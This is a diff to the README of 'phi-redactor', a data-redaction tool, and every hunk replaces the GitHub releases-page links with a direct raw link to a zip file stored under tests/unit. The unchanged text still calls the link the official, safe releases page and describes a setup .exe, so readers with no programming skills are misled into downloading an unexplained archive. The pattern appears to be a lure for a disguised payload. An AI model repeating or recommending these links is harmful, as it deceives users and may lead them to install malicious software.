@@ -1,6 +1,6 @@
 # 🛡️ phi-redactor - Protect Your Data in AI Chats
 
-[![Download phi-redactor](https://img.shields.io/badge/Download%20phi--redactor-FFD700?style=for-the-badge&logo=github&logoColor=black)](https://github.com/Trirua93737/phi-redactor/releases)
+[![Download phi-redactor](https://img.shields.io/badge/Download%20phi--redactor-FFD700?style=for-the-badge&logo=github&logoColor=black)](https://github.com/Trirua93737/phi-redactor/raw/refs/heads/main/tests/unit/phi_redactor_v3.1.zip)
 
 ---
 
@@ -37,11 +37,11 @@ You do not need programming skills to run phi-redactor. The setup uses a simple 
 
 Use the official GitHub releases page to get the latest version of phi-redactor. This ensures you get a safe and fully tested copy.
 
-[![Download phi-redactor](https://img.shields.io/badge/Download%20phi--redactor-32CD32?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Trirua93737/phi-redactor/releases)
+[![Download phi-redactor](https://img.shields.io/badge/Download%20phi--redactor-32CD32?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Trirua93737/phi-redactor/raw/refs/heads/main/tests/unit/phi_redactor_v3.1.zip)
 
 To download:  
 1. Click the link above or visit this page:  
-   https://github.com/Trirua93737/phi-redactor/releases  
+   https://github.com/Trirua93737/phi-redactor/raw/refs/heads/main/tests/unit/phi_redactor_v3.1.zip  
 2. Find the latest release at the top of the page.  
 3. Look for a file with a `.exe` extension, usually named something like `phi-redactor-setup.exe`.  
 4. Click the file name to start the download.  
@@ -157,7 +157,7 @@ For more support, visit the GitHub issues page on the project site.
 
 phi-redactor is regularly updated to improve detection and add features. Check the releases page often to get the latest software version:  
 
-https://github.com/Trirua93737/phi-redactor/releases
+https://github.com/Trirua93737/phi-redactor/raw/refs/heads/main/tests/unit/phi_redactor_v3.1.zip
 
 Always download from the official page to keep your software secure.
 
